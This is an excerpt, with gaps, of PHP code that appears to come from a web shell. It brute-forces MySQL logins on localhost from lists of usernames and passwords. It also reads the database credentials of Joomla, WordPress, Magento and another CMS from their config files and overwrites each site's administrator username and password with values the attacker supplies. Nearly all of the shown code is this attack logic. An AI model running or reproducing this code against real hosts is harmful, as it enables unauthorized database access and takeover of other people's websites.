...
} // so it will works in php7, credit @elliottophellia
@clearstatcache();
            ...
            if($_POST['crack']) {
                ...
                foreach($usercp as $ucp) {
                    foreach($passcp as $pcp) {
                        $connect = ($GLOBALS["___mysqli_ston"] = mysqli_connect('localhost',  $ucp,  $pcp));
                        if($connect) {
                ...
                if(strlen($_POST['pass_baru']) < 6 OR strlen($_POST['user_baru']) < 6) {
                    ...
                    foreach($scan_conf as $file_conf) {
                        ...
                        if(preg_match("/JConfig|joomla/",$config)) {
                            ...
                            $db = mysqli_select_db($GLOBALS["___mysqli_ston"], $dbname);
                            $q = mysqli_query($GLOBALS["___mysqli_ston"], "SELECT * FROM $prefix ORDER BY id ASC");
                            $result = mysqli_fetch_array($q);
                            $id = $result['id'];
                            $site = getValue($config,"sitename = '","'");
                            $update = mysqli_query($GLOBALS["___mysqli_ston"], "UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE id='$id'");
                            ...
                            if(!$update OR !$conn OR !$db) {
                                print "Status => ".color(1, 1, mysqli_error($GLOBALS["___mysqli_ston"]))."<br><br>";
                            } 
                            else {
                            ...
                            $result = mysqli_fetch_array($q);
                            $id = $result[ID];
                            $q2 = mysqli_query($GLOBALS["___mysqli_ston"], "SELECT * FROM $option ORDER BY option_id ASC");
                            ...
                            $update = mysqli_query($GLOBALS["___mysqli_ston"], "UPDATE $prefix SET user_login='$user_baru',user_pass='$pass_baru' WHERE id='$id'");
                            print "Config => ".$file_conf."<br>";
                        ...
                        elseif(preg_match("/Magento|Mage_Core/",$config)) {
                            ...
                            $conn = ($GLOBALS["___mysqli_ston"] = mysqli_connect($dbhost, $dbuser, $dbpass));
                            $db = mysqli_select_db($GLOBALS["___mysqli_ston"], $dbname);
                            $q = mysqli_query($GLOBALS["___mysqli_ston"], "SELECT * FROM $prefix ORDER BY user_id ASC");
                            $result = mysqli_fetch_array($q);
                            $id = $result[user_id];
                            $q2 = mysqli_query($GLOBALS["___mysqli_ston"], "SELECT * FROM $option WHERE path='web/secure/base_url'");
                            $result2 = mysqli_fetch_array($q2);
                            ...
                            $update = mysqli_query($GLOBALS["___mysqli_ston"], "UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE user_id='$id'");
                            print "Config => ".$file_conf."<br>";
                        ...
                        elseif(preg_match("/panggil fungsi validasi xss dan injection/",$config)) {
                            ...
                            $conn = ($GLOBALS["___mysqli_ston"] = mysqli_connect($dbhost, $dbuser, $dbpass));
                            $db = mysqli_select_db($GLOBALS["___mysqli_ston"], $dbname);
                            $q = mysqli_query($GLOBALS["___mysqli_ston"], "SELECT * FROM $option ORDER BY id_identitas ASC");
                            $result = mysqli_fetch_array($q);
                            ...
                            $update = mysqli_query($GLOBALS["___mysqli_ston"], "UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE level='admin'");
                            print "Config => ".$file_conf."<br>";
